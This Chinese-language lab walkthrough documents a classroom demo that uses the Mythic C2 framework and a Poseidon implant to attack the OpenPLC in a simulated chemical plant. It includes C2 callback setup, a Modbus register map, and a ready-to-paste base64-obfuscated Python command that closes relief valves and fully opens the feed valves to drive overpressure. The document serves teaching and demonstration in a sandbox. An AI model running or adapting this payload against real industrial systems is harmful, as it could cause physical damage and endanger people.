# ICS C2 攻擊演示 Walkthrough

透過 Mythic C2 框架，從 operator UI 一路打進 OT 網段的 PLC，對 GRFICS 模擬化工廠寫入
Modbus 指令，讓 3D dashboard (`localhost:8090`) 出現真實可見的超壓畫面。

這份文件記錄完整攻擊鏈的每個步驟，供簡報 (2026-07-30) 現場 demo 使用。

授權範圍提醒：這套環境只準在課堂/簡報情境自我演練，絕對不能拿去打外部目標。


## 攻擊鏈全貌

```
Mythic Operator UI (8080)
  -> GraphQL API / Hasura (8082)      建立 shell task
    -> Poseidon implant (b-ics-net)   在受害主機上執行
      -> Modbus TCP (plc:502)         寫 coil / holding register
        -> OpenPLC 326339.st          manual_mode ON + 閥門操作
          -> 物理引擎 TE_process       壓力失控往 3200 kPa 上限爬
            -> 3D Dashboard (8090)     壓力表進紅區, 漏洞計數 6/9
```

重點是整條鏈只透過 Mythic 觸發。PLC 全程只看到來自它自己 OT 網段上一台被控主機的
流量，operator 不直接碰 PLC，這樣 demo 才誠實地反映真實的 C2 -> OT 攻擊路徑。


## 環境架構與網段

GRFICS 三個網段對應真實 IT/OT 分層 (詳見 `GRFICSv3/CLAUDE.md`):

- `b-ics-net` (`192.168.95.0/24`) — OT 製程網: `simulation`, `plc`
- `c-dmz-net` (`192.168.90.0/24`) — DMZ/企業網
- `a-grfics-admin` — 管理網

關鍵 IP / port:

- PLC (OpenPLC, Modbus TCP): `192.168.95.2:502`
- 物理引擎 JSON socket (ground truth): `127.0.0.1:55555`
- 3D Dashboard: `localhost:8090`
- Mythic operator UI: `localhost:8080`
- Mythic GraphQL (Hasura): `127.0.0.1:8082`
- HTTP C2 profile: `network_mode: host`, 監聽 `0.0.0.0:80`; implant 走 bridge
  gateway `192.168.95.1:80` 回連

Bridge gateway 是這裡的關鍵設計。C2 profile 用 host network 掛在 `0.0.0.0:80`,
b-ics-net 上的 implant 就能透過 Docker bridge 的 gateway IP 回連到 operator。


## 前置條件

確認 GRFICS 服務有起來 (只需要這四個):

```
docker compose -f GRFICSv3/docker-compose.yml up -d simulation plc hmi router
```

確認 Mythic 有起來, 且 Poseidon agent 與 HTTP C2 profile 都已安裝。安裝步驟見下一節。

注意 Mythic 自帶的 postgresql 綁在 host port 5432, 這個是別的專案在用的, 全程不要動它。


## Phase 1 — 在 Mythic 安裝 Poseidon 與 HTTP C2 profile

Poseidon 是 Linux ELF implant, 之後靠它的 `shell` 指令在 OT 主機上跑 Modbus 寫入。
HTTP profile 提供 implant 回連 operator 的通道。

透過 Mythic 的 UI 或 `mythic-cli` 安裝 Poseidon agent 與 HTTP C2 profile, 等 build
container 起來後在 operator UI 確認兩者狀態正常。


## Phase 2 — 把 C2 profile 橋接到 OT 網段

讓 HTTP C2 profile container 用 `network_mode: host`, 這樣它會監聽在 host 的所有介面
(`0.0.0.0:80`) 上, 包含 Docker bridge 的 gateway。

b-ics-net 上的 implant 就能透過 bridge gateway `192.168.95.1:80` 回連到 operator,
不需要把 profile 直接掛進 b-ics-net。


## Phase 3 — 驗證回連可達性

在 b-ics-net 網段的主機上測試能不能連到 `192.168.95.1:80`。可達就代表 implant 之後
能正常 callback。


## Phase 4 — 建置並部署 Poseidon payload

用 Mythic 產生 Poseidon Linux payload, callback host 指向 bridge gateway
`192.168.95.1`, port `80`。

payload 可從 Mythic 的 REST endpoint 下載:

```
/direct/download/<agent_file_id>
```

把 payload 丟到 OT 網段的受害主機上執行, 回到 operator UI 確認出現新的 callback
(這次 demo 是 callback id 1)。


## Phase 5 — 確認 Modbus 位址對應 (只需做一次)

發動攻擊前先確認 OpenPLC 的位址對應。OpenPLC 把 `%QW` (output words) 對應到
holding register 從 HR0 開始, `%MW` (memory words) 從 HR1024 開始, `%QX` (output bits)
對應 coil 從 0 開始。

用 `dump_registers.py` 對 PLC 讀 HR0-19, HR1024-1043, coil 0-15, 跟現行 ST 程式
`326339.st` 的宣告預設值比對, 確認這個 build 用的是哪套慣例:

```
python3 dump_registers.py
```

這次 demo 確認出來的對應:

- coil 0 = `manual_mode` (`%QX0.0`) — 決定用自動還是手動閥門 setpoint
- coil 40 = `run_bit`
- HR10-13 = 手動閥門 setpoint (feed1 / feed2 / purge / product)
- HR1024 = `product_flow_setpoint`
- HR1025 = `a_setpoint` (30801)
- HR1026 = `pressure_sp` (55295)
- HR1027 = `override_sp` (31675)
- HR1028 = `level_sp` (28835)

現行執行的是 `326339.st`, 不是 `655326.st`。


## Phase 6 — 在 Mythic operator UI 手動下 shell 指令

這是 demo 的核心畫面 — 觀眾要看到 operator 坐在 Mythic 前面對受控 host 下指令,
指令效果一路穿透到 OT 網段的 PLC。用腳本繞過 UI 直打 GraphQL 會失掉這條敘事
(見附錄)。

打開 operator UI (`localhost:8080`), 從左側 callback 列表點進 callback 1 的
Interact 視窗。

準備 payload — 遠端要跑的 Python 一次送五筆 Modbus write-single, 讓攻擊自成一體,
不需要在受害主機上額外裝工具。五筆寫入:

- `manual_mode` ON — FC05 寫 coil 0 = `0xFF00`, PLC 改吃手動閥門設定
- purge valve 關 — FC06 寫 HR12 = 0
- product valve 關 — FC06 寫 HR13 = 0
- feed1 valve 全開 — FC06 寫 HR10 = 65535
- feed2 valve 全開 — FC06 寫 HR11 = 65535

進料全開 + 排放全關 = 反應器壓力持續累積, 直到物理引擎的 3200 kPa 上限。

Modbus TCP frame 格式 (`>HHHBBHH`): transaction_id, protocol_id, length, unit_id,
function_code, register_addr, value。FC05 = write single coil (`0xFF00` = ON),
FC06 = write single register。

多行 Python 沒辦法直接塞進 Poseidon shell 的單行參數 (見疑難排解),
所以整段包 base64 再 exec。要貼進 Mythic UI task 輸入框的完整指令:

```
shell python3 -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCwgc3RydWN0CmRlZiB0eChwa3QpOgogICAgcyA9IHNvY2tldC5jcmVhdGVfY29ubmVjdGlvbigoIjE5Mi4xNjguOTUuMiIsIDUwMiksIDUpCiAgICBzLnNlbmQocGt0KQogICAgciA9IHMucmVjdig2NCkKICAgIHMuY2xvc2UoKQogICAgcmV0dXJuIHIuaGV4KCkKCnByaW50KCJtYW51YWxfbW9kZSA6IiwgdHgoc3RydWN0LnBhY2soIj5ISEhCQkhIIiwgMSwwLDYsMSw1LDAsMHhGRjAwKSkpCnByaW50KCJwdXJnZV92YWx2ZSA6IiwgdHgoc3RydWN0LnBhY2soIj5ISEhCQkhIIiwgMiwwLDYsMSw2LDEyLDApKSkKcHJpbnQoInByb2R1Y3RfdmFsdmU6IiwgdHgoc3RydWN0LnBhY2soIj5ISEhCQkhIIiwgMywwLDYsMSw2LDEzLDApKSkKcHJpbnQoImZlZWQxX3ZhbHZlIDoiLCB0eChzdHJ1Y3QucGFjaygiPkhISEJCSEgiLCA0LDAsNiwxLDYsMTAsNjU1MzUpKSkKcHJpbnQoImZlZWQyX3ZhbHZlIDoiLCB0eChzdHJ1Y3QucGFjaygiPkhISEJCSEgiLCA1LDAsNiwxLDYsMTEsNjU1MzUpKSk='))"
```

如果環境的 PLC IP 不是 192.168.95.2 或要改寫入清單, 用 `generate_payload.py` 重新
產生一段新的 shell 指令 (見腳本清單)。

送出後觀眾在 UI 上看到:

- 這個 task 從 submitted -> processing -> completed (Poseidon 下次 checkin 拉到)
- Task response 列出五筆 Modbus 回應的 hex frame
- 幾秒內 3D dashboard 壓力表衝進紅區

背景發生的事: Mythic 把 task 排進 callback 佇列, Poseidon 下次 HTTP checkin 拉到後
fork/exec 那段指令; Python 解 base64 執行內含的 Modbus 寫入; 五筆 write-single 打向
`192.168.95.2:502`, PLC 每筆回 ack; Poseidon 收 stdout 當 response 傳回 Mythic; UI
render 給 operator。


## Phase 7 — 觀察 dashboard 畫面

打開 `localhost:8090`, 攻擊生效後畫面上會看到:

- 壓力表 (pressure gauge) 指針深入紅區
- "Physical Vulnerabilities Found" 計數跳到 6/9

想看 ground truth 數據 (繞過 PLC 與 Modbus, 直接問物理引擎), 另開一個終端跑:

```
python3 watch_plant.py 60
```

會每秒印出 `pressure` / `level` / `purge_valve` / `purge_flow`。這次 demo 觀察到壓力
從約 2652 kPa 一路爬過 3072 kPa 還在往 3200 上限逼近, 全程沒有中斷。


## 復原工廠 (重複 demo 用)

攻擊後工廠會卡在被打的狀態 (manual_mode ON, purge/product 閥關, feed 全開, 壓力 3000+)。
重跑一輪前要復原:

```
docker compose -f GRFICSv3/docker-compose.yml restart simulation
```

等約 15 秒壓力回到約 2700 kPa 正常運轉, 就能再跑一次 `attack_via_c2.py` 重現。

如果只想清 e_stop (見下面), 用 `clear_estop.py` 對物理引擎 socket 送 `e_stop=0`。


## 疑難排解

### 攻擊到一半 dashboard 突然被 e_stop 打斷

原因是有人在 Unity WebGL dashboard 上不小心按到 `E`。Panel HMI 的告示牌就寫著
"Press E to pull the E-stop", 這會透過 PHP API 對物理引擎 socket 送 e_stop 請求, 把
整個工廠鎖進安全狀態, 之後 PLC 寫什麼都不會動製程。

確認過模擬引擎原始碼裡沒有任何以壓力為門檻的自動 e_stop 觸發 — e_stop 只會被鍵盤 `E`
或 PHP API 手動觸發。所以重跑攻擊時, dashboard 分頁不要碰鍵盤就好。

### remote Python 出現 SyntaxError

不能把多行 Python 用分號壓成一行 (`def tx(pkt):;` 是非法語法)。`attack_via_c2.py`
的解法是把整段 remote Python 用 base64 編碼, implant 端用
`python3 -c "import base64;exec(base64.b64decode('...'))"` 還原執行, 保留原本的多行結構。

### JWT token 過期

`attack_via_c2.py` 裡的 `TOKEN` 是 Mythic 的 JWT (這次 exp=1784960161), 會過期。
過期後要用 Mythic 帳密對 `POST /auth` 重新拿 token 換上去。

### `docker compose restart` 報 "no configuration file provided"

代表你不在有 `docker-compose.yml` 的目錄。用 `-f GRFICSv3/docker-compose.yml` 指定路徑,
或先切到 `GRFICSv3/` 目錄再下指令。


## 相關腳本清單

輔助腳本 (放在 job tmp 目錄):

- `generate_payload.py` — 產生 Phase 6 要貼進 Mythic UI 的 shell 指令
  (改 PLC IP 或 Modbus 寫入清單後重跑, 拿新的 base64 payload)
- `dump_registers.py` — 讀 PLC 暫存器/coil, 確認位址對應 (Phase 5 用)
- `watch_plant.py` — 每秒讀物理引擎狀態, 觀察壓力變化 (Phase 7 用)
- `clear_estop.py` — 對物理引擎送 e_stop=0 清除急停 (dashboard 被誤觸 E 時救急用)
- `sim_state.py` — 讀物理引擎原始 JSON 狀態 (ground truth)
- `attack_via_c2.py` — 開發用, 直接對 Mythic GraphQL 下 task; 不建議 demo 時用
  (見附錄)


## 附錄 — 用 Python 腳本走 GraphQL API (開發用)

`attack_via_c2.py` 做的事跟 Phase 6 手動貼指令等價, 只是繞過 UI 直接對 Mythic
GraphQL endpoint 下 createTask mutation, 再輪詢 task 結果印出來。

用途只有兩個:

- 開發階段快速迭代 payload (改一次跑一次, 不用每次都手貼進 UI)
- 事前驗證整條攻擊鏈還通 (JWT 沒過期、callback 還活著、PLC 還在響應)

demo 現場用它就失掉核心敘事 — 觀眾只看到你螢幕上一個 Python 腳本在跑, 完全看不見
Mythic UI, C2 的存在感直接歸零。這條路等於自己騙自己攻擊透過 C2, 實際上跳過了
operator 唯一該碰的介面。所以正式 demo 走 Phase 6, 這個腳本只在準備階段用。

腳本的兩個關鍵: 用 JWT token 對 GraphQL endpoint 認證 (Mythic 帳密登入拿到的,
有效期見 JWT 的 exp claim); 對 createTask mutation 送
`{callback_id, command: "shell", params: <encoded>}`, 再 poll `task_by_pk` 拿到
`responses.response_text` (base64), 解碼印出。TOKEN 過期就要重拿。
